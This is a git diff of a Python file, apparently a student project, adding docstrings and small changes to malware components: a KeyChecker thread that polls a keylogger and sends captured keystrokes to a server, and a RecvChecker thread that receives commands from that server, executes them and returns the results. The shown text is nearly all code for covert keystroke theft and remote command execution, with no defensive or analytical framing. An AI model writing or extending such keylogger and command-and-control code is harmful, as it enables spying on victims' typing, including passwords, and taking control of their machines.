@@ -23,6 +23,11 @@ __email__ = "nec2887@rit.edu"
 
 
 class KeyChecker(threading.Thread):
+    """
+    This thread will monitor the keylogger and if
+    it has keys that it has captured it will take
+    those keys and send them off to the server.
+    """
     __slots__ = ['keylogger']
 
     def __init__(self, keylogger):
@@ -30,18 +35,41 @@ class KeyChecker(threading.Thread):
         self.keylogger = keylogger
 
     def run(self):
+        """
+        Will continually poll the the keylogger for whether
+        or not it has information to send.  If it does
+        have information it will get the information
+        and send it off to the server.
+        :return:
+        """
         while True:
             if self.keylogger.hasInfoToSend():
                 info = self.keylogger.getInfo()
-                net.send(''.join(info))
-            time.sleep(0)
+                net.send(info)
+            time.sleep(5000)
 
 
 class RecvChecker(threading.Thread):
+    """
+    This thread is designed to received messages sent from
+    the server and execute the received message and send the
+    results back to the requesting server.
+    """
+
     def __init__(self):
+        """
+        Simple constructor
+        """
         super().__init__()
 
     def run(self):
+        """
+        Constantly checks if there is received message
+        and if it is a valid command it will be executed
+        and the results will be piped back to the requesting
+        server.
+        :return:
+        """
         while True:
             command = net.recv()
             if (self.verifyCommand(command)):
